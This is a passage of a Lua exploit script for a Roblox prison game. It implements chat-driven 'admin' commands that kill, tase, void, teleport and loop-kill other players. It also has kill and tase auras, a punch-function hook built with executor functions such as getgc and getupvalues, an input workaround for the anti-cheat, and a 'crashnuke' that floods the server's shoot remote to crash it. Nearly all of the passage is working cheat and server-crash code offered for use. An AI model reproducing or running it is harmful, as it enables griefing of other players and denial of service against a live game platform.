                    WarnProtected(Admin, Player, "void");
                end;
            else
                NotAValidPlayer("void");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name " Used void command on " .. Player.Name .. ". ");
        else
            WarnDisabled("void");
        end;
    end;
    if CMD2("ctp") then
        Chat("/w " .. Admin.Name .. " This command is experimental!");
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not ClickTeleports[Player.UserId] then
                                ClickTeleports[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled click teleport for " .. Player.Name .. " - shoot anywhere with a gun to teleport (type " .. PF .. "ctp " .. Player.Name .. " to disable).")
                            else
                                ClickTeleports[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled click teleport for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " I cannot do that right now.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "ctp");
                end;
            else
                NotAValidPlayer("ctp");
            end;
        else
            WarnDisabled("ctp");
        end;
    end;
    if CMD2("oneshot") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not Oneshots[Player.UserId] then
                                Oneshots[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled one shot for " .. Player.Name .. " (type " .. PF .. "oneshot " .. Player.Name .. " to disable).")
                            else
                                Oneshots[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled one shot for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " Error! This command is disabled.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "oneshot");
                end;
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used oneshot command on " .. Player.Name .. ". ");
            else
                NotAValidPlayer("oneshot");
            end;
        else
            WarnDisabled("oneshot");
        end;
    end;
    if CMD2("onepunch") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        if not States.AntiCrash then
                            if not Onepunch[Player.UserId] then
                                Onepunch[Player.UserId] = Player;
                                Chat("/w " .. Player.Name .. " Enabled one punch for " .. Player.Name .. " (type " .. PF .. "onepunch " .. Player.Name .. " to disable).")
                            else
                                Onepunch[Player.UserId] = nil;
                                Chat("/w " .. Player.Name .. " Disabled one punch for " .. Player.Name .. ".");
                            end;
                        else
                            Chat("/w " .. Player.Name .. " I cannot do that right now.");
                        end;
                    end);
                else
                    WarnProtected(Admin, Player, "onepunch");
                end;
            else
                NotAValidPlayer("onepunch");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used onepunch command on " .. Player.Name .. ". ");
        else
            WarnDisabled("onepunch");
        end;
    end;
    if CMD2("bring") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                            local originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            pcall(function()
                            TeleportPlayers(Player, Admin);
                            end)
                            Chat("/w " .. Admin.Name .. " Brought " .. Player.Name .. ".");
                            wait(1)
           game:GetService("VirtualInputManager"):SendKeyEvent(true, "Space", false, game) --I used virtualinputmanager because byfrons fault
           task.wait(.1)
           game:GetService("VirtualInputManager"):SendKeyEvent(false, "Space", false, game)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition
                        end);
                    end);
                else
                    WarnProtected(Admin, Player, "bring");
                end;
            else
                NotAValidPlayer("bring");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used bring command on " .. Player.Name .. ". ");
        else
            WarnDisabled("void");
        end;
    end;
    if CMD2("to") or CMD2("goto") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                            local mysavedpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                            pcall(function()
                            TeleportPlayers(Admin, Player);
                            end)
                            wait(1)
           game:GetService("VirtualInputManager"):SendKeyEvent(true, "Space", false, game) --I used virtualinputmanager because byfrons fault
           task.wait(.1)
           game:GetService("VirtualInputManager"):SendKeyEvent(false, "Space", false, game)
                            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysavedpos
                        end);
                    end);
                else
                    WarnProtected(Admin, Player, "goto");
                end;
            else
                NotAValidPlayer("goto");
            end;
            AddLog("Success", "Ranked Player: "  .. Admin.Name .. " Used goto command to " .. Player.Name .. ". ");
        else
            WarnDisabled("goto");
        end;
    end;
end;

--// Player removed / added:
local function PlayerRemoving(PLR)
    if CurrentlyViewing then
        if CurrentlyViewing.Player == PLR then
            CurrentlyViewing = nil;
            pcall(function()
                Camera.CameraSubject = LocalPlayer.Character.Humanoid
            end);
        end;
    end;
    if ArmorSpamFlags[PLR.Name] then
        ArmorSpamFlags[PLR.Name] = nil;
    end;
end;

local function PlayerAdded(PLR)
    if Loopkilling[PLR.UserId] then
        Loopkilling[PLR.UserId] = PLR;
    end;
    if LoopTasing[PLR.UserId] then
        LoopTasing[PLR.UserId] = PLR;
    end;
    if MeleeKilling[PLR.UserId] then
        MeleeKilling[PLR.UserId] = PLR;
    end;
    if Admins[PLR.UserId] then
        Admins[PLR.UserId] = PLR;
    end;
    if Protected[PLR.UserId] then
        Protected[PLR.UserId] = PLR;
    end;
    if SpeedKilling[PLR.UserId] then
        SpeedKilling[PLR.UserId] = PLR;
    end;
    if Loopkilling[PLR.UserId] then
        LoopTo[PLR.UserId] = PLR;
    end;
    PLR.Chatted:Connect(function(Message)
        if Admins[PLR.UserId] then
            UseRankedCommands(Message, PLR);
        end;
    end);
end;

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        v.Chatted:Connect(function(Message)
            if Admins[v.UserId] then
                UseRankedCommands(Message, v);
            end;
        end);
    end;
end;

--// Connections:
LocalPlayer.Chatted:Connect(UseCommand);

LocalPlayer.CharacterAdded:Connect(AutoRespawnCharacterAdded);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    local Humanoid = CHAR:WaitForChild("Humanoid", 1);
    if Humanoid then
        LocalViewerAdded();
        Humanoid.Died:Connect(function()
            pcall(function()
                Camera.CameraSubject = CurrentlyViewing.Player.Character;
            end);
        end);
    end;
end);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if States.AutoGuns then
        GiveGuns();
    end;
    pcall(function()
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("M9"));
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("Handcuffs"));
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild("Taser"));
    end);
end);

LocalPlayer.CharacterAdded:Connect(function(CHAR)
    if not Info.StopRespawnLag then
        local ClientInputHandler = CHAR:WaitForChild("ClientInputHandler", 1);
        if ClientInputHandler then
            --[[YieldUntilScriptLoaded(ClientInputHandler);
            --local PF;]]
            PunchFunction = nil;
            Info.PunchFunction = nil;
            task.wait(1);
            for i,v in pairs(getgc()) do
                if type(v) == "function" and getfenv(v).script == ClientInputHandler then
                    --local isPunchFunction = false;
                    for i2,v2 in pairs(getupvalues(v)) do
                        if tostring(v2) == "fight_left" then
                            PunchFunction = v
                            break
                        end;
                    end;
                    if PunchFunction then
                        break
                    end;
                end;
            end;
            if PunchFunction then
                --PunchFunction = v;
                
                --// hookin it
                local Old = PunchFunction;
                PunchFunction = function(...)
                    if States.OnePunch then
                        local Character;
                        if States.PunchAura then
                            Character = ClosestCharacter(20);
                        else
                            Character = ClosestCharacter(5);
                        end;
                        if Character then
                            for i = 1, 15 do
                                MeleeEvent(Players:GetPlayerFromCharacter(Character));
                            end;
                        end;
                    end;
                    return Old(...)
                end;
                Info.PunchFunction = PunchFunction;
            end;
        end;
    end;
end);

Players.PlayerAdded:Connect(PlayerAdded);
Players.PlayerRemoving:Connect(PlayerRemoving);

--// Trapped Players:
task.spawn(function()
    while task.wait(0.03) do
        if next(Trapped) then
            for i,v in next, Trapped do
                pcall(function()
                    if (v.Character.HumanoidRootPart.Position-Vector3.new(-297, 54, 2004)).Magnitude > 80 and v.Character.Torso.Anchored ~= true and v.Character.Humanoid.Health > 0 then
                        mysaved.trappedoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(v, CFrame.new(-297, 54, 2004));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.trappedoldpos
                    end;
                end);
            end;
        end;
        if next(Loopvoided) then
            for i,v in next, Loopvoided do
                task.spawn(function()
                    if v.Character.Humanoid.Health > 0 and LocalPlayer.Character.Humanoid.Health ~= 0 and not v.Character.Humanoid.Sit and not myarguments.donotexec_loopvoid then
                        myarguments.donotexec_loopvoid = true
                        mysaved.voidcmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        pcall(function()
                        Teleport(v, CFrame.new(0, 9e9, 0));
                        diedpos = mysaved.voidcmdoldpos
                        wait(1)
                        --Jump()
                        Refresh()
                        chwait()
                        diedpos = mysaved.voidcmdoldpos
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.voidcmdoldpos
                        end)
                        task.wait(3)
                        myarguments.donotexec_loopvoid = false
                    end;
                end);
            end;
        end;
    end;
end);

--// Loopkills:
task.spawn(function()
    while task.wait() do
    local success, error = pcall(function()
        if next(Loopkilling) then
            local LKPlayers = {};
            for i,v in next, Loopkilling do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    if Humanoid and Humanoid.Health > 0 and not ForceField then
                        LKPlayers[#LKPlayers+1] = v;
                    end;
                end;
            end;
            if next(LKPlayers) then
                Kill(LKPlayers);
            end;
        end;
    end)
    
    if not success then
        warn("An error occurred:", error)
    end
    end;
end);

--// Speed Kills:
task.spawn(function()
    while true do
        if next(SpeedKilling) then
            local SpeedKillPlayers = {}
            for i,v in next, SpeedKilling do
                if v.Character and CheckProtected(v, "killcmds") then
                    SpeedKillPlayers[#SpeedKillPlayers+1] = v;
                    end;
                end;
            if next(SpeedKillPlayers) then
                --task.spawn(SpeedKill, SpeedKillPlayers);
                SpeedKill(SpeedKillPlayers)
            end;
        end;
        task.wait(0.03)
    end;
end);

--// Melee/Teleport Kills:
task.spawn(function()
    while task.wait() do
        pcall(function()
        if States.TeleKillAll then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Players:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not TeleportKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                TeleportKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.TeleKillInmates then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Inmates:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not TeleportKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                TeleportKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.TeleKillGuards then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Guards:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not TeleportKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                TeleportKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.TeleKillCriminals then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Criminals:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not TeleportKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                TeleportKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        end;
        if next(TeleportKilling) then
            local DoSavePos = false;
            mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
            for i,v in next, TeleportKilling do
                if v.Character and CheckProtected(v, "killcmds") then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    if Humanoid and Humanoid.Health > 0 and not ForceField then
                        TeleportKill(v);
                        DoSavePos = true;
                    end;
                end;
            end;
            if DoSavePos then
                LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
            end;
        end;
        if States.MeleeAll then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Players:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not MeleeKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                MeleeKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.MeleeInmates then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Inmates:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not MeleeKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                MeleeKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.MeleeGuards then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Guards:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not MeleeKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                MeleeKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        elseif States.MeleeCriminals then
            if next(Players:GetPlayers()) then
                local DoSavePos = false;
                mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                for i,v in pairs(Teams.Criminals:GetPlayers()) do   
                    if v ~= LocalPlayer then
                        if v.Character and not MeleeKilling[v.UserId] and CheckProtected(v, "killcmds") then
                            local Humanoid = v.Character:FindFirstChild("Humanoid");
                            local ForceField = v.Character:FindFirstChild("ForceField");
                            if Humanoid and Humanoid.Health > 0 and not ForceField then
                                MeleeKill(v);
                                DoSavePos = true;
                            end;
                        end;
                    end;
                end;
                if DoSavePos then
                    LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
                end;
            end;
        end;
        if next(MeleeKilling) then
            local DoSavePos = false;
            mysaved.teleport_meleekilloldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
            for i,v in next, MeleeKilling do
                if v.Character and CheckProtected(v, "killcmds") then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    if Humanoid and Humanoid.Health > 0 and not ForceField then
                        MeleeKill(v);
                        DoSavePos = true;
                    end;
                end;
            end;
            if DoSavePos then
                LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.teleport_meleekilloldpos
            end;
        end;
        end)
    end;
end);

--// Nukes and Crashnukes:
task.spawn(function()
    while task.wait(0.03) do
        if next(Nukes) then
            for i,v in next, Nukes do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
                    if Humanoid then
                        if Humanoid.Health <= 0 then
                            Chat("!!! THE NUKE (" .. v.DisplayName .. ") HAS BEEN ACTIVATED - EVERYONE WILL DIE IN 5 SECONDS !!!");
                            task.wait(1);
                            Chat("4...");
                            task.wait(1);
                            Chat("3...");
                            task.wait(1);
                            Chat("2...");
                            task.wait(1);
                            Chat("1...");
                            task.wait(1);
                            local PTable = Players:GetPlayers();
                            for _,x in next, Nukes do
                                for i,y in next, PTable do
                                    if y == x then
                                        table.remove(PTable, i);
                                    end;
                                    if not CheckProtected(y, "killcmds") then
                                        table.remove(PTable, i);
                                    end;
                                end;
                            end;
                            Kill(PTable);
                        end;
                    end;
                end;
            end;
        end;
        if next(SuperNukes) then
            for i,v in next, SuperNukes do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
                    if Humanoid then
                        if Humanoid.Health <= 0 then
                            Chat("!!! THE CRASHNUKE (" .. v.DisplayName .. ") HAS BEEN ACTIVATED - SAY YOUR LAST GOODBYES BEFORE THE SERVER CRASHES !!!");
                            task.wait(1)
                            Chat("THE SERVER WILL CRASH IN 5..");
                            task.wait(1.5);
                            Chat("THE SERVER WILL CRASH IN 4...");
                            task.wait(1.5);
                            Chat("THE SERVER WILL CRASH IN 3...");
                            task.wait(1.5);
                            Chat("THE SERVER WILL CRASH IN 2...");
                            task.wait(1.5);
                            Chat("THE SERVER WILL CRASH IN 1...");
                            task.wait(1);

	if #game:GetService("Teams").Guards:GetPlayers() < 8 then
                SaveCameraPos()
                diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		workspace.Remote.TeamEvent:FireServer("Bright blue")
	else
        task.spawn(function()
        Workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild("M9") or workspace.Prison_ITEMS.single:FindFirstChild("M9")})
        end)
        end
    task.spawn(function()
        local Events = {}
        task.wait(1/10);
        for i = 1, 50 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("M9") or LocalPlayer.Character:FindFirstChild("M9");
                        if not Gun then
	if #game:GetService("Teams").Guards:GetPlayers() < 8 then
                SaveCameraPos()
                diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		workspace.Remote.TeamEvent:FireServer("Bright blue")
	else
        local originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        repeat task.wait()
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(823.65094, 97.9999161, 2245.10767, -0.999999464, -1.04425968e-10, 0.0010568779, 4.0250827e-11, 1, 1.36890719e-07, -0.0010568779, 1.36890691e-07, -0.999999464)
        task.spawn(function()
        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP);
        end)
        until game.Players.LocalPlayer.Backpack:FindFirstChild("M9") or game.Players.LocalPlayer.Character:FindFirstChild("M9")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalPosition
        end
                        end
                        if Gun then
                            task.spawn(function()
                            rStorage.ReloadEvent:FireServer(Gun);
                            end)
                            task.spawn(function()
                            rStorage.ShootEvent:FireServer(Events, Gun);
                            end)
                        end
                    end)
                end;
            end;
        end);
    end)
        Notify("Success", "Crashing server...", 2);
                        end;
                    end;
                end;
            end;
        end;
    end;
end)

--// Chaosmode:
task.spawn(function()
while task.wait(.1) do
pcall(function()
if States.Chaosmode then
for i,v in pairs(Players:GetPlayers()) do
    if not myarguments.nonexistentnil2312 then
        if v.Character and not myarguments.donotexecutechaos then
            local Humanoid = v.Character:FindFirstChildWhichIsA("Humanoid");
            if Humanoid then
                if Humanoid.Health == 0 and not myarguments.donotexecutechaos then
                    myarguments.donotexecutechaos = true
                    print("Debug_Set do not execute chaos to true")
                    Chat("!!! (" .. v.DisplayName .. ") HAS DIED, EVERYONE WILL NOW DIE !!!");
                    task.wait(.4)
                    KillPlayers(Players);
                    task.wait(7)
                    myarguments.donotexecutechaos = false
                end
            end;
        else
           print("Debug_Do not execute chaos is: true")
        end;
    end;
end;
end
end)
end
end)

--// Loop tase:
task.spawn(function()
    while task.wait(1/5) do
        if States.TaseAll then
            task.wait(.4)
            Tase(Players:GetPlayers());
        end;
        if next(LoopTasing) then
            local TPlayers = {};
            for i,v in next, LoopTasing do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local Team = v.TeamColor.Name
                    if Humanoid and Humanoid.Health > 0 and Team ~= "Bright blue" then
                        TPlayers[#TPlayers+1] = v;
                    end;
                end;
            end;
            if next(TPlayers) then
                Tase(TPlayers);
            end;
        end;
    end;
end)

--// Virus
task.spawn(function()
    while task.wait(.07) do
      pcall(function()
        if next(Infected) then
            local VirusPlayers = {};
            for i,v in next, Infected do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChildWhichIsA("BasePart");
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 6 then
                                            VirusPlayers[#VirusPlayers+1] = plr;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(VirusPlayers) then
                Kill(VirusPlayers);
            end;
        end;
      end)
    end;
end)

--// Kill Aura
task.spawn(function()
    while task.wait(.1) do
      pcall(function()
        if next(KillAuras) then
            local InAura = {};
            for i,v in next, KillAuras do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChildWhichIsA("BasePart");
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 20 then
                                            InAura[#InAura+1] = plr;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(InAura) then
                Kill(InAura);
            end;
        end;
      end)
    end;
end)

--// Tase Aura
task.spawn(function()
    while task.wait(1/3) do
        if next(TaseAuras) then
            local InAura = {};
            for i,v in next, TaseAuras do
                if v.Character then
                    local Humanoid = v.Character:FindFirstChild("Humanoid");
                    local ForceField = v.Character:FindFirstChild("ForceField");
                    local PrimaryPart = v.Character:FindFirstChildWhichIsA("BasePart");
                    if PrimaryPart and Humanoid and Humanoid.Health > 0 and not ForceField then
                        for _,plr in pairs(Players:GetPlayers()) do
                            if CheckProtected(plr, "killcmds") then
                                if plr.Character and plr ~= LocalPlayer and plr ~= v then
                                    local VPart = plr.Character:FindFirstChild("HumanoidRootPart");
                                    local VTorso = plr.Character:FindFirstChild("Torso")
                                    local PHum = plr.Character:FindFirstChild("Humanoid");
                                    local FF = plr.Character:FindFirstChild("ForceField")
                                    if VPart and PHum and VTorso and not FF then
                                        if PHum.Health > 0 and (PrimaryPart.Position-VPart.Position).Magnitude <= 20 then
                                            if (VPart.Position-VTorso.Position).Magnitude <= 1 then
                                                InAura[#InAura+1] = plr;
                                            end;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if next(InAura) then
                Tase(InAura);
            end;
        end;
    end;
end)

local function OnePunchF(Player)
    local function CharacterAdded(Char)
        if Char then
            local Humanoid = Char:WaitForChild("Humanoid", 1);
            local RootPart = Char:WaitForChild("HumanoidRootPart", 1);
            local PrimaryPart = Char:WaitForChild("Head", 1)
            if Humanoid and RootPart and PrimaryPart then
                Humanoid.AnimationPlayed:Connect(function(Track)
                    if Onepunch[Player.UserId] then
                        if Track.Animation.AnimationId == "rbxassetid://484200742" or Track.Animation.AnimationId == "rbxassetid://484926359" then
                            for i,v in pairs(Players:GetPlayers()) do
                                if v ~= Player and v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                                    if v.Character then
                                        pcall(function()
                                            local VPart = v.Character.PrimaryPart;
                                            local PPart = PrimaryPart;
                                            local Angle = math.deg(math.acos(Char.HumanoidRootPart.CFrame.LookVector.unit:Dot((VPart.Position-PPart.Position).unit)))
                                            if Angle < 50 and (PPart.Position-VPart.Position).Magnitude <= 10 then
                                                Kill({v});
                                            end;
                                        end);
                                    end;
                                end;
                            end;
                        end;
                    end;
                end);
            end;
        end;
    end;

    CharacterAdded(Player.Character);

    Player.CharacterAdded:Connect(CharacterAdded);
end;  

for i,v in pairs(Players:GetPlayers()) do
    if v ~= LocalPlayer then
        OnePunchF(v);
    end;
end;

Players.PlayerAdded:Connect(OnePunchF);

--// NoClip:
rService.Stepped:Connect(function()
    if States.NoClip then
        if LocalPlayer.Character then
            for i,v in pairs(LocalPlayer.Character:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false;
                end;
            end;
        end;
    end;
end);

--// Team kill:
task.spawn(function()
    while task.wait(.25) do
    local success, error = pcall(function()
        if States.KillAll then
            KillPlayers(Players);
        end;
        if States.KillInmates then
            KillPlayers(Teams.Inmates);
        end;
        if States.KillGuards then
            KillPlayers(Teams.Guards);
        end;
        if States.KillCriminals then
            KillPlayers(Teams.Criminals);
        end;
    end)
    
    if not success then
        warn("An error occurred:", error)
    end
    end;
end)

--// Hostile kill:
task.spawn(function()
    while task.wait(.1) do
    local success, error = pcall(function()
        if States.KillHostiles then
local Players = game:GetService("Players")
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer and CheckProtected(player, "killcmds") then
        if not player.Character:FindFirstChild("ForceField") and player.Character:FindFirstChild("Humanoid").Health ~= 0 then
                    local handcuffs = player.Character:FindFirstChild("Handcuffs")
                    if handcuffs then
                        Kill({player});
                        print("Debug_KilledHoldingHandcuffs")
                    end
                    local AK47 = player.Character:FindFirstChild("AK-47")
                    local Remington = player.Character:FindFirstChild("Remington 870")
                    local M9 = player.Character:FindFirstChild("M9")
                    local M4A1 = player.Character:FindFirstChild("M4A1")
                    local Taser = player.Character:FindFirstChild("Taser")
                    local Hammer = player.Character:FindFirstChild("Hammer")
                    local Knife = player.Character:FindFirstChild("Crude Knife")
                    if AK47 or Remington or M9 or M4A1 or Taser or Hammer or Knife then
                        Kill({player});
                        print("Debug_KilledHoldingHostileItems")
                    end
